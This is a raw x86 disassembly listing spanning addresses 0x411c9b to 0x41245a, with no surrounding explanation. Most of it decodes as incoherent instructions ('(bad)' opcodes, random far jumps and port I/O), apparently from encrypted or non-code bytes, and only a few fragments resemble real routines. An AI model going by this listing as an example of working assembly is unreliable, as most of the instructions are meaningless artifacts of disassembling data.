  411c9b:	aam    0xff
  411c9d:	scas   eax,DWORD PTR es:[edi]
  411c9e:	inc    edi
  411c9f:	cli    
  411ca0:	shl    DWORD PTR [edx+0x79],0x97
  411ca4:	xor    dh,BYTE PTR [ecx-0x367c7b88]
  411caa:	nop
  411cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cac:	sbb    ebp,esi
  411cae:	adc    cl,BYTE PTR [eax+0x53ce9807]
  411cb4:	inc    edx
  411cb5:	test   eax,0xc5d04869
  411cba:	hlt    
  411cbb:	push   0x2d
  411cbd:	pop    es
  411cbe:	dec    esi
  411cbf:	outs   dx,DWORD PTR ds:[esi]
  411cc0:	and    ebx,DWORD PTR [edi-0x8fef6fe]
  411cc6:	loopne 0x411cb3
  411cc8:	xchg   ebx,eax
  411cc9:	jnp    0x411d0a
  411ccb:	aas    
  411ccc:	add    al,0xca
  411cce:	aam    0xfe
  411cd0:	push   ebx
  411cd1:	(bad)  
  411cd2:	inc    esp
  411cd3:	xchg   edx,eax
  411cd4:	jmp    0x411d1e
  411cd6:	loop   0x411c85
  411cd8:	jge    0x411d41
  411cda:	ins    DWORD PTR es:[edi],dx
  411cdb:	imul   eax,DWORD PTR [ebx],0xffffffdc
  411cde:	or     BYTE PTR [edx+edx*2+0x73],al
  411ce2:	stos   DWORD PTR es:[edi],eax
  411ce3:	arpl   WORD PTR [ebx],dx
  411ce5:	push   0xffffffe3
  411ce7:	jl     0x411cc0
  411ce9:	mov    al,ds:0x31b434c7
  411cee:	in     al,0xa2
  411cf0:	xor    eax,0x6531db1c
  411cf5:	test   bh,ch
  411cf7:	retf   
  411cf8:	iret   
  411cf9:	fdiv   st(5),st
  411cfb:	pop    ecx
  411cfc:	fimul  DWORD PTR [edi+ecx*2-0x6b0f63e]
  411d03:	daa    
  411d04:	mov    ds:0x919988fb,al
  411d09:	jb     0x411d44
  411d0b:	out    0xa2,al
  411d0d:	jmp    0x6c0c:0x9de2bbbd
  411d14:	mov    ebp,0xfb5b4d47
  411d19:	outs   dx,DWORD PTR ds:[esi]
  411d1a:	ret    0x2099
  411d1d:	rcr    DWORD PTR [esi],cl
  411d1f:	xchg   esi,eax
  411d20:	imul   eax,DWORD PTR fs:[eax+esi*1-0x50],0xffffff8f
  411d26:	and    al,BYTE PTR [edi+0x10]
  411d29:	mov    BYTE PTR [ecx+0x39],bh
  411d2c:	sar    BYTE PTR [edx],cl
  411d2e:	xchg   esi,eax
  411d2f:	mov    eax,ds:0x6efc881d
  411d34:	cmp    BYTE PTR [ecx+0x6daf39c],al
  411d3a:	jle    0x411d65
  411d3c:	mov    ebp,esi
  411d3e:	bound  eax,QWORD PTR [ecx+ecx*4]
  411d41:	add    BYTE PTR [ebx],0x7b
  411d44:	(bad)  
  411d45:	dec    esi
  411d46:	inc    edx
  411d47:	into   
  411d48:	jmp    0x442a:0x1ea9087b
  411d4f:	xor    bh,0x7a
  411d52:	push   esp
  411d53:	cmp    ebx,DWORD PTR es:[eax]
  411d56:	stos   DWORD PTR es:[edi],eax
  411d57:	adc    ah,bh
  411d59:	jmp    0xdfe8469c
  411d5e:	cmp    al,dl
  411d60:	pop    edi
  411d61:	mov    al,0x1a
  411d63:	dec    edx
  411d64:	adc    BYTE PTR [ebp+0x53],bl
  411d67:	xor    DWORD PTR ds:0x3f6e0d8d,esi
  411d6d:	xchg   edi,eax
  411d6e:	inc    edx
  411d6f:	xchg   esi,eax
  411d70:	sub    al,0xde
  411d72:	mov    esp,DWORD PTR [edx]
  411d74:	dec    edi
  411d75:	pop    esp
  411d76:	mov    bl,0xec
  411d78:	pop    ds
  411d79:	sbb    BYTE PTR [ecx+0x4d],bl
  411d7c:	jno    0x411d9d
  411d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d7f:	jl     0x411d0d
  411d81:	les    eax,FWORD PTR [ebx+0x50]
  411d84:	sahf   
  411d85:	xchg   edx,eax
  411d86:	mov    esi,0x3803f4f6
  411d8b:	xlat   BYTE PTR ds:[ebx]
  411d8c:	call   0x71469eb
  411d91:	mov    WORD PTR [ebp-0x62708530],?
  411d97:	xchg   DWORD PTR [eax+eax*1],esp
  411d9a:	add    al,0x4c
  411d9c:	popa   
  411d9d:	inc    ecx
  411d9e:	xor    DWORD PTR [edx-0x624c2b06],edi
  411da4:	jne    0x411d85
  411da6:	(bad)  
  411da7:	into   
  411da8:	mov    eax,ds:0x344dd41d
  411dad:	cmc    
  411dae:	pop    edx
  411daf:	mov    ds:0xecd828e3,al
  411db4:	gs loopne 0x411d8d
  411db7:	nop
  411db8:	test   al,0x86
  411dba:	pusha  
  411dbb:	push   ds
  411dbc:	dec    edi
  411dbd:	repz inc eax
  411dbf:	repz inc esp
  411dc1:	cmp    DWORD PTR fs:[ecx-0x3e],esp
  411dc5:	dec    eax
  411dc6:	mov    ebx,0x3de4ed24
  411dcb:	mov    ch,0x53
  411dcd:	in     al,0x52
  411dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dd0:	and    DWORD PTR [ecx+0x18],0xffffffad
  411dd4:	retf   0xb3e6
  411dd7:	in     eax,dx
  411dd8:	cmp    DWORD PTR [eax],edx
  411dda:	xor    ch,BYTE PTR [esi]
  411ddc:	xchg   ebp,eax
  411ddd:	pop    ss
  411dde:	fcomp  QWORD PTR [ebp-0x55]
  411de1:	test   BYTE PTR [ebx-0x11],al
  411de4:	or     eax,0x5a7bf760
  411de9:	adc    esp,DWORD PTR [eax+0x62d24f1a]
  411def:	xor    BYTE PTR [eax-0x1a5ec4d4],0x67
  411df6:	push   ebx
  411df7:	shl    bh,1
  411df9:	push   esi
  411dfa:	sub    edi,DWORD PTR [ebx+0x17592e63]
  411e00:	ss mov esp,0x4695c30
  411e06:	or     ebp,DWORD PTR [eax+0x1df801]
  411e0c:	mov    cl,0xe1
  411e0e:	inc    edi
  411e0f:	popa   
  411e10:	cwde   
  411e11:	xchg   edx,eax
  411e12:	pop    ds
  411e13:	inc    esi
  411e14:	inc    ebp
  411e15:	aaa    
  411e16:	cdq    
  411e17:	loopne 0x411dd7
  411e19:	mov    al,ds:0xe6292dde
  411e1e:	cld    
  411e1f:	lahf   
  411e20:	xchg   ebx,ecx
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	in     eax,dx
  411e4c:	push   ds
  411e4d:	or     ebx,DWORD PTR [edx+0x70704810]
  411e53:	dec    ecx
  411e54:	jge    0x411ec6
  411e56:	jo     0x411eb4
  411e58:	call   0x9591:0x28ddac5c
  411e5f:	in     al,0x2e
  411e61:	(bad)  
  411e62:	push   edx
  411e63:	xchg   ebp,eax
  411e64:	sub    cl,ah
  411e66:	push   es
  411e67:	in     eax,0x2c
  411e69:	rol    DWORD PTR [ecx+0x22],1
  411e6c:	push   esi
  411e6d:	fst    DWORD PTR [esi]
  411e6f:	sbb    ebx,DWORD PTR [edi]
  411e71:	cmp    edi,DWORD PTR [ebp-0x5a]
  411e74:	rol    DWORD PTR [ecx],0x4c
  411e77:	bound  ebx,QWORD PTR gs:[eax]
  411e7a:	outs   dx,BYTE PTR ds:[esi]
  411e7b:	ins    DWORD PTR es:[edi],dx
  411e7c:	push   eax
  411e7d:	ror    DWORD PTR [esi+0x6b2455ec],1
  411e83:	in     al,dx
  411e84:	jae    0x411e58
  411e86:	icebp  
  411e87:	cmp    dh,dl
  411e89:	in     eax,dx
  411e8a:	std    
  411e8b:	or     eax,0x96cc8347
  411e90:	mov    DWORD PTR [edx-0x1ebafca8],ebp
  411e96:	mov    bl,0xee
  411e98:	push   cs
  411e99:	cmp    ch,BYTE PTR [eax+0x4e10a179]
  411e9f:	pusha  
  411ea0:	arpl   WORD PTR [edx+ebx*1],dx
  411ea3:	fld    DWORD PTR [edi-0x63aa5a80]
  411ea9:	and    eax,DWORD PTR [eax+ebx*1+0x1f49e5ef]
  411eb0:	add    edx,DWORD PTR [esi]
  411eb2:	push   ebx
  411eb3:	jle    0x411ec9
  411eb5:	lds    eax,FWORD PTR [eiz*2+0x4a7fa3d0]
  411ebc:	sahf   
  411ebd:	outs   dx,BYTE PTR ds:[esi]
  411ebe:	arpl   WORD PTR fs:[esi-0x58],bx
  411ec2:	cli    
  411ec3:	mov    ds:0xca10f45,eax
  411ec8:	push   ds
  411ec9:	dec    esp
  411eca:	pop    ds
  411ecb:	sub    edx,ebx
  411ecd:	or     ebp,DWORD PTR [eax]
  411ecf:	call   0x1d32:0x9f4d8d42
  411ed6:	adc    eax,0x6bf3f47c
  411edb:	outs   dx,BYTE PTR es:[esi]
  411edd:	jp     0x411ed2
  411edf:	push   eax
  411ee0:	mov    ebp,0xd90fda72
  411ee5:	inc    ebp
  411ee6:	mov    al,0x35
  411ee8:	inc    eax
  411ee9:	inc    esp
  411eea:	out    0x27,al
  411eec:	inc    esi
  411eed:	mov    esi,0x75dd2aef
  411ef2:	ret    
  411ef3:	in     eax,dx
  411ef4:	mov    ds:0xb7156794,eax
  411ef9:	stc    
  411efa:	sbb    eax,0x8463a533
  411eff:	jmp    0x411eca
  411f01:	mov    ss,WORD PTR [edx+0xaa350c]
  411f07:	mov    ebp,0x7ecb9823
  411f0c:	mov    DWORD PTR [eax-0x39],ecx
  411f0f:	retf   
  411f10:	mov    dl,ch
  411f12:	call   0xc295:0x33b4aa9d
  411f19:	sbb    ch,BYTE PTR [edx+0x1f]
  411f1c:	lahf   
  411f1d:	shr    edi,1
  411f1f:	dec    eax
  411f20:	or     eax,0xc37831c7
  411f25:	aam    0x8e
  411f27:	cmp    al,0xde
  411f29:	mov    ebx,0x148e807e
  411f2e:	adc    dh,BYTE PTR [ebx]
  411f30:	adc    eax,0x27319811
  411f35:	mov    dh,0x8b
  411f37:	test   al,0x69
  411f39:	lods   al,BYTE PTR ds:[esi]
  411f3a:	retf   0xee5d
  411f3d:	sbb    eax,DWORD PTR [esi]
  411f3f:	adc    al,0x33
  411f41:	mov    edi,0x95c859b4
  411f46:	and    esp,ebp
  411f48:	not    BYTE PTR [ebp+0x29]
  411f4b:	pop    ecx
  411f4c:	adc    dl,0x90
  411f4f:	xchg   BYTE PTR [edx],dh
  411f51:	ja     0x411efe
  411f53:	pop    ss
  411f54:	stc    
  411f55:	push   edi
  411f56:	mov    esi,0x7be0ef2e
  411f5b:	mov    WORD PTR [ecx],?
  411f5d:	jp     0x411f5c
  411f5f:	inc    ebx
  411f60:	cmc    
  411f61:	jae    0x411f23
  411f63:	fldenv [esi-0x72bc94e2]
  411f69:	push   ss
  411f6a:	int3   
  411f6b:	clc    
  411f6c:	lea    edx,ds:0x838e3462
  411f72:	js     0x411f37
  411f74:	scas   eax,DWORD PTR es:[edi]
  411f75:	call   0x3b16bc60
  411f7a:	lea    esp,[ebx]
  411f7c:	xor    eax,0xe8b580ba
  411f81:	xor    ecx,DWORD PTR [edx]
  411f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f84:	pop    ecx
  411f85:	sbb    eax,0x5fee4212
  411f8a:	ror    eax,0xca
  411f8d:	or     ebx,ebx
  411f8f:	(bad)
  411f92:	ins    DWORD PTR es:[edi],dx
  411f93:	sub    ah,BYTE PTR [edx+0x70ad4739]
  411f99:	int    0x8
  411f9b:	es pop ebp
  411f9d:	cmc    
  411f9e:	test   esp,ecx
  411fa0:	fimul  DWORD PTR [ebp+0x71f332fe]
  411fa6:	(bad)  
  411fa7:	lock in al,dx
  411fa9:	jge    0x411ffb
  411fab:	push   ecx
  411fac:	inc    edx
  411fad:	fsubrp st(7),st
  411faf:	mov    bh,0xfc
  411fb1:	shl    DWORD PTR [ecx],0x61
  411fb4:	jl     0x411f8f
  411fb6:	clc    
  411fb7:	inc    esi
  411fb8:	fwait
  411fb9:	inc    edi
  411fba:	jmp    0x947:0x65437d0b
  411fc1:	fcos   
  411fc3:	push   edx
  411fc4:	push   eax
  411fc5:	jecxz  0x411f51
  411fc7:	pusha  
  411fc8:	sub    dh,BYTE PTR [eax+esi*1+0x5e95a18c]
  411fcf:	mov    ss,WORD PTR [edx+0x1f0d6377]
  411fd5:	(bad)  
  411fd6:	rep stos BYTE PTR es:[edi],al
  411fd8:	mov    ebp,0xb303e337
  411fdd:	dec    eax
  411fde:	xor    DWORD PTR [ebx+0x52],ecx
  411fe1:	jg     0x411f7f
  411fe3:	push   ecx
  411fe4:	stc    
  411fe5:	mov    eax,ds:0x58763009
  411fea:	in     eax,dx
  411feb:	fcomp  QWORD PTR [ebp-0xe85eefa]
  411ff1:	aad    0x9f
  411ff3:	sub    edx,edi
  411ff5:	jns    0x41205b
  411ff7:	pop    esi
  411ff8:	or     ebx,DWORD PTR [ebx+0x24be91c6]
  411ffe:	push   ebx
  411fff:	mov    ah,0x19
  412001:	out    dx,al
  412002:	xchg   DWORD PTR [edx],esp
  412004:	dec    ebp
  412005:	sub    al,0x33
  412007:	inc    eax
  412008:	aad    0x41
  41200a:	in     al,0x44
  41200c:	jne    0x411fdf
  41200e:	adc    al,0xd2
  412010:	mov    ebp,0x1ebf32f4
  412015:	cmp    BYTE PTR [edx],0x6
  412018:	fcmovb st,st(2)
  41201a:	adc    BYTE PTR gs:[ecx],al
  41201d:	add    ah,BYTE PTR [esi+0x52]
  412020:	lahf   
  412021:	adc    ch,BYTE PTR [esi+0x6e]
  412024:	pop    edi
  412025:	sbb    al,0xca
  412027:	or     eax,0xf82d05d0
  41202c:	jae    0x412068
  41202e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41202f:	jbe    0x412022
  412031:	sbb    BYTE PTR [ebx+0x3d],cl
  412034:	sahf   
  412035:	or     DWORD PTR [ebx+0x1f],0xffffffd8
  412039:	loope  0x412024
  41203b:	(bad)  
  41203d:	stos   BYTE PTR es:[edi],al
  41203e:	ret    0x1265
  412041:	lahf   
  412042:	xchg   edx,eax
  412043:	retf   
  412044:	sub    DWORD PTR [eax],edi
  412046:	stos   BYTE PTR es:[edi],al
  412047:	mov    BYTE PTR [edx+eax*2-0x10],0xfc
  41204c:	arpl   WORD PTR [edx+0xc381362],bx
  412052:	dec    ebx
  412053:	loope  0x411ff6
  412055:	js     0x411fff
  412057:	adc    eax,0x358e852d
  41205c:	push   ss
  41205d:	jge    0x4120d7
  41205f:	scas   al,BYTE PTR es:[edi]
  412060:	pop    eax
  412061:	repz cmp esi,edi
  412064:	jb     0x411fea
  412066:	dec    eax
  412067:	sti    
  412068:	push   edi
  412069:	(bad)
  41206c:	pop    edx
  41206d:	mov    al,0x93
  41206f:	or     al,0x63
  412071:	and    DWORD PTR [ebx-0x4019a8ac],edx
  412077:	mov    bh,0x65
  412079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41207a:	or     eax,0x9b7bad85
  41207f:	and    eax,0x9664bc2d
  412084:	add    esi,DWORD PTR [esi-0x2ce558f8]
  41208a:	add    eax,0xca540231
  41208f:	or     dl,BYTE PTR [ebx-0x5f340ac4]
  412095:	popa   
  412096:	cmp    eax,ebx
  412098:	mov    esp,?
  41209a:	cmp    BYTE PTR [esi],bl
  41209c:	dec    edi
  41209d:	push   ecx
  41209e:	dec    esi
  41209f:	lds    ebp,FWORD PTR [edx+0x4aaf6043]
  4120a5:	in     eax,dx
  4120a6:	lock dec esi
  4120a8:	imul   ebp,edx,0xd18d152d
  4120ae:	outs   dx,BYTE PTR ds:[esi]
  4120af:	push   0xa14f347c
  4120b4:	data16 gs xor al,0xf2
  4120b8:	xor    BYTE PTR ds:0x51ca1e27,al
  4120be:	hlt    
  4120bf:	pusha  
  4120c0:	es (bad) 
  4120c2:	popa   
  4120c3:	addr16 das 
  4120c5:	xchg   ebp,eax
  4120c6:	ins    BYTE PTR es:[edi],dx
  4120c7:	cli    
  4120c8:	jmp    0x41205a
  4120ca:	pop    ds
  4120cb:	arpl   ax,bp
  4120cd:	jmp    0x412133
  4120cf:	das    
  4120d0:	add    ebx,esi
  4120d2:	mov    al,ds:0xfb851c32
  4120d7:	xchg   ebp,eax
  4120d8:	push   ebp
  4120d9:	cmp    ah,dl
  4120db:	into   
  4120dc:	xchg   edx,eax
  4120dd:	push   eax
  4120de:	gs or  al,0x7f
  4120e1:	mov    fs,eax
  4120e3:	mov    ch,0xb9
  4120e5:	clc    
  4120e6:	in     al,0xc7
  4120e8:	add    BYTE PTR [esi+0x37],cl
  4120eb:	xor    DWORD PTR [ebx+0x63f036d4],edi
  4120f1:	scas   eax,DWORD PTR es:[edi]
  4120f2:	and    esp,DWORD PTR [ebx-0xc65167f]
  4120f8:	xor    BYTE PTR [ecx-0x64],cl
  4120fb:	aad    0xa1
  4120fd:	push   ds
  4120fe:	xor    al,0xa3
  412100:	xchg   esp,eax
  412101:	mov    ch,0x78
  412103:	cmp    bh,cl
  412105:	and    DWORD PTR [eax-0x5886673d],eax
  41210b:	pop    edx
  41210c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41210d:	xchg   DWORD PTR [eax-0x3c],ebp
  412110:	xchg   esp,eax
  412111:	jbe    0x412142
  412113:	mov    cl,0xea
  412115:	loope  0x412115
  412117:	sub    BYTE PTR [ecx-0x5c],bh
  41211a:	sbb    DWORD PTR ds:0x474b8304,ebx
  412120:	int    0x7c
  412122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412123:	scas   al,BYTE PTR es:[edi]
  412124:	mov    edi,eax
  412126:	dec    ebp
  412127:	sbb    eax,0xdced8710
  41212c:	fcomip st,st(1)
  41212e:	cdq    
  41212f:	mov    edi,0x68f2a528
  412134:	add    eax,0x4c24d73f
  412139:	and    DWORD PTR [esi+eax*4+0x18a3085b],esp
  412140:	sbb    ecx,DWORD PTR [edi]
  412142:	clc    
  412143:	mov    ds:0xfa059869,eax
  412148:	push   esi
  412149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41214a:	outs   dx,BYTE PTR ds:[esi]
  41214b:	mov    al,ds:0x75811491
  412150:	ins    BYTE PTR es:[edi],dx
  412151:	lods   eax,DWORD PTR ds:[esi]
  412152:	xchg   ebp,eax
  412153:	sbb    al,0xa1
  412155:	sub    DWORD PTR [esi+eiz*2-0x344b1a26],ecx
  41215c:	push   0xe951c271
  412161:	fisttp QWORD PTR [ecx+0x16d094e6]
  412167:	stos   DWORD PTR es:[edi],eax
  412168:	nop
  412169:	iret   
  41216a:	push   es
  41216b:	xchg   bh,dl
  41216d:	leave  
  41216e:	add    DWORD PTR [esi+0x6d8d06c2],esp
  412174:	fisub  WORD PTR [edx]
  412176:	adc    eax,0xcc43e6d6
  41217b:	jmp    0xa00e:0x6fba8e85
  412182:	sub    edi,edx
  412184:	ds inc edx
  412186:	push   0x6cc8134f
  41218b:	retf   0x15f1
  41218e:	xchg   esi,eax
  41218f:	in     eax,dx
  412190:	push   ebp
  412191:	call   0xfd6f:0xd1437ee6
  412198:	outs   dx,DWORD PTR ds:[esi]
  412199:	les    eax,FWORD PTR [edx+0x1b]
  41219c:	push   ecx
  41219d:	inc    esp
  41219e:	mov    al,0x8b
  4121a0:	jns    0x4121fb
  4121a2:	ins    DWORD PTR es:[edi],dx
  4121a3:	inc    ebx
  4121a4:	push   ebp
  4121a5:	stos   BYTE PTR es:[edi],al
  4121a6:	jmp    0x10ce:0xe0e07423
  4121ad:	mov    bh,0xb9
  4121af:	shr    al,1
  4121b1:	inc    edx
  4121b2:	mov    ecx,0xd89a8360
  4121b7:	cmp    DWORD PTR [ebp+0x5d],ebp
  4121ba:	sar    bh,1
  4121bc:	ror    ebp,0x20
  4121bf:	jne    0x412189
  4121c1:	xchg   ebp,eax
  4121c2:	and    DWORD PTR [esi-0x2d],0x25
  4121c6:	out    0x78,eax
  4121c8:	outs   dx,BYTE PTR ds:[esi]
  4121c9:	adc    BYTE PTR [ecx-0x44767ca6],0xd8
  4121d0:	test   BYTE PTR [esi+0x4188fbc5],bh
  4121d6:	or     ebx,esp
  4121d8:	je     0x41215d
  4121da:	mov    al,ds:0x754bd069
  4121df:	enter  0xf32c,0x1
  4121e3:	dec    esp
  4121e4:	stos   DWORD PTR es:[edi],eax
  4121e5:	mov    esp,edx
  4121e7:	push   ss
  4121e8:	mov    bl,0x8f
  4121ea:	mov    eax,0x38f42f9
  4121ef:	push   esi
  4121f0:	loop   0x412175
  4121f2:	xor    al,0x12
  4121f4:	push   ecx
  4121f5:	mov    bl,0x4b
  4121f7:	cdq    
  4121f8:	push   0x1eaaff67
  4121fd:	popf   
  4121fe:	mov    esi,0xabd6456c
  412203:	das    
  412204:	shr    BYTE PTR [edx],1
  412206:	je     0x4121cc
  412208:	ds pop ebx
  41220a:	retf   0xea15
  41220d:	push   es
  41220e:	jbe    0x4121a4
  412210:	mov    ds:0xf88e604e,eax
  412215:	pushf  
  412216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412217:	stc    
  412218:	push   ss
  412219:	ror    BYTE PTR [edx+0x5d],1
  41221c:	sbb    eax,0xa263ffd9
  412221:	call   0x55e4:0x67cf07f5
  412228:	std    
  412229:	sbb    edx,DWORD PTR [esi*8+0x334b0f08]
  412230:	rol    BYTE PTR [ecx],cl
  412232:	pop    ebp
  412233:	hlt    
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
